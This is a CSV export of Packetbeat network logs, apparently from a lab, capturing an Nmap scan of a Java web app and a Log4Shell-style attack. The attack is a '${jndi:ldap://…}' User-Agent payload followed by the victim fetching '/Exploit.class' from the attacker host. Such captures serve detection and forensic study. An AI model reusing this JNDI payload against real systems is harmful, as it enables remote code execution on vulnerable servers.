"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","bytes_in","bytes_out","client.bytes","client.ip","client.port","destination.bytes","destination.domain","destination.ip","destination.port","ecs.version","event.category","event.dataset","event.duration","event.end","event.kind","event.start","event.type","host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","http.request.body.bytes","http.request.bytes","http.request.headers.content-length","http.request.headers.content-type","http.request.method","http.response.body.bytes","http.response.bytes","http.response.headers.content-length","http.response.headers.content-type","http.response.status_code","http.response.status_phrase","http.version",method,"network.bytes","network.community_id","network.direction","network.protocol","network.transport","network.type",query,"related.hosts","related.ip","server.bytes","server.domain","server.ip","server.port","source.bytes","source.ip","source.port",status,type,"url.domain","url.extension","url.full","url.full.text","url.path","url.port","url.query","url.scheme","user_agent.original","user_agent.original.text"
"Oct 24, 2022 @ 22:17:04.468",uW1aCoQBuPHkiK7OrBjt,".ds-packetbeat-8.4.3-2022.10.21-000001","-","b1f63b84-b570-4844-b454-06604fc52e78",6502fff7073b,"db9fe2bf-3a6e-4386-9ce8-e9e3b0ab6bf5",6502fff7073b,packetbeat,"8.4.3",211B,"1.5KB",211B,"172.16.0.2",57636,"1.5KB","-","172.16.0.9",8000,"8.0.0",network,http,"1.4","Oct 24, 2022 @ 22:17:04.470",event,"Oct 24, 2022 @ 22:17:04.468","connection, protocol","x86_64",false,6502fff7073b,b26468769e4940f5ae029e74a095fd54,"172.16.0.9","02:42:ac:10:00:09",6502fff7073b,jammy,debian,"5.15.0-52-generic",Ubuntu,Ubuntu,ubuntu,linux,"22.04.1 LTS (Jammy Jellyfish)","-",211B,0,"-",GET,"1.3KB","1.5KB","1,359","application/java-vm",200,ok,"1.1",GET,"1.7KB","1:MIDHRHx+Ads3/wsgzQ+aKa8H1bQ=",ingress,http,tcp,ipv4,"GET /Exploit.class","-","172.16.0.2, 172.16.0.9","1.5KB","-","172.16.0.9",8000,211B,"172.16.0.2",57636,OK,http,"172.16.0.9",class,"http://172.16.0.9:8000/Exploit.class","http://172.16.0.9:8000/Exploit.class","/Exploit.class",8000,"-",http,"Java/1.8.0_102","Java/1.8.0_102"
"Oct 24, 2022 @ 22:17:04.468",u21aCoQBuPHkiK7OrBjw,".ds-packetbeat-8.4.3-2022.10.21-000001","-","39ca81d4-4b17-4019-ba27-8912f5c3cb59",3ecee31220f8,"d55246a3-1b5d-45ff-81bd-f60ddc719c99",3ecee31220f8,packetbeat,"8.4.3",211B,"1.5KB",211B,"172.16.0.2",57636,"1.5KB","-","172.16.0.9",8000,"8.0.0",network,http,"1.5","Oct 24, 2022 @ 22:17:04.470",event,"Oct 24, 2022 @ 22:17:04.468","connection, protocol","x86_64",false,3ecee31220f8,f3e41f31b6024d84806ddf3a54075add,"172.16.0.2","02:42:ac:10:00:02",3ecee31220f8,jessie,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"8 (jessie)","-",211B,0,"-",GET,"1.3KB","1.5KB","1,359","application/java-vm",200,ok,"1.1",GET,"1.7KB","1:MIDHRHx+Ads3/wsgzQ+aKa8H1bQ=",egress,http,tcp,ipv4,"GET /Exploit.class","-","172.16.0.2, 172.16.0.9","1.5KB","-","172.16.0.9",8000,211B,"172.16.0.2",57636,OK,http,"172.16.0.9",class,"http://172.16.0.9:8000/Exploit.class","http://172.16.0.9:8000/Exploit.class","/Exploit.class",8000,"-",http,"Java/1.8.0_102","Java/1.8.0_102"
"Oct 24, 2022 @ 22:16:27.272","5WxaCoQBuPHkiK7OG_qc",".ds-packetbeat-8.4.3-2022.10.21-000001","-","39ca81d4-4b17-4019-ba27-8912f5c3cb59",3ecee31220f8,"d55246a3-1b5d-45ff-81bd-f60ddc719c99",3ecee31220f8,packetbeat,"8.4.3",211B,"1.5KB",211B,"172.16.0.2",52418,"1.5KB","-","172.16.0.9",8000,"8.0.0",network,http,"14.7","Oct 24, 2022 @ 22:16:27.287",event,"Oct 24, 2022 @ 22:16:27.272","connection, protocol","x86_64",false,3ecee31220f8,f3e41f31b6024d84806ddf3a54075add,"172.16.0.2","02:42:ac:10:00:02",3ecee31220f8,jessie,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"8 (jessie)","-",211B,0,"-",GET,"1.3KB","1.5KB","1,359","application/java-vm",200,ok,"1.1",GET,"1.7KB","1:kcs64I7T8QtdDSF5Do838kQEaFA=",egress,http,tcp,ipv4,"GET /Exploit.class","-","172.16.0.2, 172.16.0.9","1.5KB","-","172.16.0.9",8000,211B,"172.16.0.2",52418,OK,http,"172.16.0.9",class,"http://172.16.0.9:8000/Exploit.class","http://172.16.0.9:8000/Exploit.class","/Exploit.class",8000,"-",http,"Java/1.8.0_102","Java/1.8.0_102"
"Oct 24, 2022 @ 22:16:27.272","5mxaCoQBuPHkiK7OG_qd",".ds-packetbeat-8.4.3-2022.10.21-000001","-","b1f63b84-b570-4844-b454-06604fc52e78",6502fff7073b,"db9fe2bf-3a6e-4386-9ce8-e9e3b0ab6bf5",6502fff7073b,packetbeat,"8.4.3",211B,"1.5KB",211B,"172.16.0.2",52418,"1.5KB","-","172.16.0.9",8000,"8.0.0",network,http,"14.6","Oct 24, 2022 @ 22:16:27.287",event,"Oct 24, 2022 @ 22:16:27.272","connection, protocol","x86_64",false,6502fff7073b,b26468769e4940f5ae029e74a095fd54,"172.16.0.9","02:42:ac:10:00:09",6502fff7073b,jammy,debian,"5.15.0-52-generic",Ubuntu,Ubuntu,ubuntu,linux,"22.04.1 LTS (Jammy Jellyfish)","-",211B,0,"-",GET,"1.3KB","1.5KB","1,359","application/java-vm",200,ok,"1.1",GET,"1.7KB","1:kcs64I7T8QtdDSF5Do838kQEaFA=",ingress,http,tcp,ipv4,"GET /Exploit.class","-","172.16.0.2, 172.16.0.9","1.5KB","-","172.16.0.9",8000,211B,"172.16.0.2",52418,OK,http,"172.16.0.9",class,"http://172.16.0.9:8000/Exploit.class","http://172.16.0.9:8000/Exploit.class","/Exploit.class",8000,"-",http,"Java/1.8.0_102","Java/1.8.0_102"
"Oct 24, 2022 @ 22:16:20.148",N2xaCoQBuPHkiK7OBPrt,".ds-packetbeat-8.4.3-2022.10.21-000001","-","39ca81d4-4b17-4019-ba27-8912f5c3cb59",3ecee31220f8,"d55246a3-1b5d-45ff-81bd-f60ddc719c99",3ecee31220f8,packetbeat,"8.4.3",170B,"2.6KB",170B,"172.16.0.9",47980,"2.6KB","-","172.16.0.2",8080,"8.0.0",network,http,"27.6","Oct 24, 2022 @ 22:16:20.176",event,"Oct 24, 2022 @ 22:16:20.148","connection, protocol","x86_64",false,3ecee31220f8,f3e41f31b6024d84806ddf3a54075add,"172.16.0.2","02:42:ac:10:00:02",3ecee31220f8,jessie,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"8 (jessie)","-",170B,0,"-",GET,"2.4KB","2.6KB","2,469","text/html;charset=ISO-8859-1",200,ok,"1.1",GET,"2.8KB","1:LWXJXc9CcS3IaKzzHf4PTS4C2yg=",ingress,http,tcp,ipv4,"GET /","-","172.16.0.9, 172.16.0.2","2.6KB","-","172.16.0.2",8080,170B,"172.16.0.9",47980,OK,http,"172.16.0.2","-","http://172.16.0.2:8080/","http://172.16.0.2:8080/","/",8080,"-",http,"${jndi:ldap://172.16.0.9:8888/${java:version}}","${jndi:ldap://172.16.0.9:8888/${java:version}}"
"Oct 24, 2022 @ 22:16:20.148",nmxaCoQBuPHkiK7OBfpP,".ds-packetbeat-8.4.3-2022.10.21-000001","-","b1f63b84-b570-4844-b454-06604fc52e78",6502fff7073b,"db9fe2bf-3a6e-4386-9ce8-e9e3b0ab6bf5",6502fff7073b,packetbeat,"8.4.3",170B,"2.6KB",170B,"172.16.0.9",47980,"2.6KB","-","172.16.0.2",8080,"8.0.0",network,http,"27.6","Oct 24, 2022 @ 22:16:20.176",event,"Oct 24, 2022 @ 22:16:20.148","connection, protocol","x86_64",false,6502fff7073b,b26468769e4940f5ae029e74a095fd54,"172.16.0.9","02:42:ac:10:00:09",6502fff7073b,jammy,debian,"5.15.0-52-generic",Ubuntu,Ubuntu,ubuntu,linux,"22.04.1 LTS (Jammy Jellyfish)","-",170B,0,"-",GET,"2.4KB","2.6KB","2,469","text/html;charset=ISO-8859-1",200,ok,"1.1",GET,"2.8KB","1:LWXJXc9CcS3IaKzzHf4PTS4C2yg=",egress,http,tcp,ipv4,"GET /","-","172.16.0.9, 172.16.0.2","2.6KB","-","172.16.0.2",8080,170B,"172.16.0.9",47980,OK,http,"172.16.0.2","-","http://172.16.0.2:8080/","http://172.16.0.2:8080/","/",8080,"-",http,"${jndi:ldap://172.16.0.9:8888/${java:version}}","${jndi:ldap://172.16.0.9:8888/${java:version}}"
"Oct 24, 2022 @ 22:16:18.227","DWxZCoQBuPHkiK7O9_Kj",".ds-packetbeat-8.4.3-2022.10.21-000001","-","39ca81d4-4b17-4019-ba27-8912f5c3cb59",3ecee31220f8,"d55246a3-1b5d-45ff-81bd-f60ddc719c99",3ecee31220f8,packetbeat,"8.4.3",192B,"2.6KB",192B,"172.16.0.9",47880,"2.6KB","3204_webapp_1.3204_companyABC","172.16.0.2",8080,"8.0.0",network,http,"5.6","Oct 24, 2022 @ 22:16:18.233",event,"Oct 24, 2022 @ 22:16:18.227","connection, protocol","x86_64",false,3ecee31220f8,f3e41f31b6024d84806ddf3a54075add,"172.16.0.2","02:42:ac:10:00:02",3ecee31220f8,jessie,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"8 (jessie)","-",192B,0,"-",POST,"2.4KB","2.6KB","2,469","text/html;charset=ISO-8859-1",200,ok,"1.1",POST,"2.8KB","1:RB/OxqzqC0ouwpsXZ8VVn1O/rvI=",ingress,http,tcp,ipv4,"POST /","3204_webapp_1.3204_companyABC","172.16.0.9, 172.16.0.2","2.6KB","3204_webapp_1.3204_companyABC","172.16.0.2",8080,192B,"172.16.0.9",47880,OK,http,"3204_webapp_1.3204_companyABC","-","http://3204_webapp_1.3204_companyABC:8080/","http://3204_webapp_1.3204_companyABC:8080/","/",8080,"-",http,"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)","Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
"Oct 24, 2022 @ 22:16:18.227","NmxZCoQBuPHkiK7O9_LJ",".ds-packetbeat-8.4.3-2022.10.21-000001","-","b1f63b84-b570-4844-b454-06604fc52e78",6502fff7073b,"db9fe2bf-3a6e-4386-9ce8-e9e3b0ab6bf5",6502fff7073b,packetbeat,"8.4.3",192B,"2.6KB",192B,"172.16.0.9",47880,"2.6KB","3204_webapp_1.3204_companyABC","172.16.0.2",8080,"8.0.0",network,http,"5.6","Oct 24, 2022 @ 22:16:18.233",event,"Oct 24, 2022 @ 22:16:18.227","connection, protocol","x86_64",false,6502fff7073b,b26468769e4940f5ae029e74a095fd54,"172.16.0.9","02:42:ac:10:00:09",6502fff7073b,jammy,debian,"5.15.0-52-generic",Ubuntu,Ubuntu,ubuntu,linux,"22.04.1 LTS (Jammy Jellyfish)","-",192B,0,"-",POST,"2.4KB","2.6KB","2,469","text/html;charset=ISO-8859-1",200,ok,"1.1",POST,"2.8KB","1:RB/OxqzqC0ouwpsXZ8VVn1O/rvI=",egress,http,tcp,ipv4,"POST /","3204_webapp_1.3204_companyABC","172.16.0.9, 172.16.0.2","2.6KB","3204_webapp_1.3204_companyABC","172.16.0.2",8080,192B,"172.16.0.9",47880,OK,http,"3204_webapp_1.3204_companyABC","-","http://3204_webapp_1.3204_companyABC:8080/","http://3204_webapp_1.3204_companyABC:8080/","/",8080,"-",http,"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)","Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
"Oct 24, 2022 @ 22:16:18.204","CWxZCoQBuPHkiK7O9_Kj",".ds-packetbeat-8.4.3-2022.10.21-000001","-","39ca81d4-4b17-4019-ba27-8912f5c3cb59",3ecee31220f8,"d55246a3-1b5d-45ff-81bd-f60ddc719c99",3ecee31220f8,packetbeat,"8.4.3",173B,249B,173B,"172.16.0.9",47832,249B,"3204_webapp_1.3204_companyABC","172.16.0.2",8080,"8.0.0",network,http,"8.8","Oct 24, 2022 @ 22:16:18.212",event,"Oct 24, 2022 @ 22:16:18.204","connection, protocol","x86_64",false,3ecee31220f8,f3e41f31b6024d84806ddf3a54075add,"172.16.0.2","02:42:ac:10:00:02",3ecee31220f8,jessie,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"8 (jessie)","-",173B,0,"-",HEAD,"-",249B,0,"text/html;charset=ISO-8859-1",200,ok,"1.1",HEAD,422B,"1:OGhGyUuGDvY3DsZkSZ43OB1VZ1E=",ingress,http,tcp,ipv4,"HEAD /","3204_webapp_1.3204_companyABC","172.16.0.9, 172.16.0.2",249B,"3204_webapp_1.3204_companyABC","172.16.0.2",8080,173B,"172.16.0.9",47832,OK,http,"3204_webapp_1.3204_companyABC","-","http://3204_webapp_1.3204_companyABC:8080/","http://3204_webapp_1.3204_companyABC:8080/","/",8080,"-",http,"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)","Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
"Oct 24, 2022 @ 22:16:18.204","C2xZCoQBuPHkiK7O9_Kj",".ds-packetbeat-8.4.3-2022.10.21-000001","-","39ca81d4-4b17-4019-ba27-8912f5c3cb59",3ecee31220f8,"d55246a3-1b5d-45ff-81bd-f60ddc719c99",3ecee31220f8,packetbeat,"8.4.3",172B,"2.6KB",172B,"172.16.0.9",47862,"2.6KB","3204_webapp_1.3204_companyABC","172.16.0.2",8080,"8.0.0",network,http,"19.4","Oct 24, 2022 @ 22:16:18.223",event,"Oct 24, 2022 @ 22:16:18.204","connection, protocol","x86_64",false,3ecee31220f8,f3e41f31b6024d84806ddf3a54075add,"172.16.0.2","02:42:ac:10:00:02",3ecee31220f8,jessie,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"8 (jessie)","-",172B,0,"-",GET,"2.4KB","2.6KB","2,469","text/html;charset=ISO-8859-1",200,ok,"1.1",GET,"2.8KB","1:VbP0/+gfu3O9ajbygGq2AK7afz4=",ingress,http,tcp,ipv4,"GET /","3204_webapp_1.3204_companyABC","172.16.0.9, 172.16.0.2","2.6KB","3204_webapp_1.3204_companyABC","172.16.0.2",8080,172B,"172.16.0.9",47862,OK,http,"3204_webapp_1.3204_companyABC","-","http://3204_webapp_1.3204_companyABC:8080/","http://3204_webapp_1.3204_companyABC:8080/","/",8080,"-",http,"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)","Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
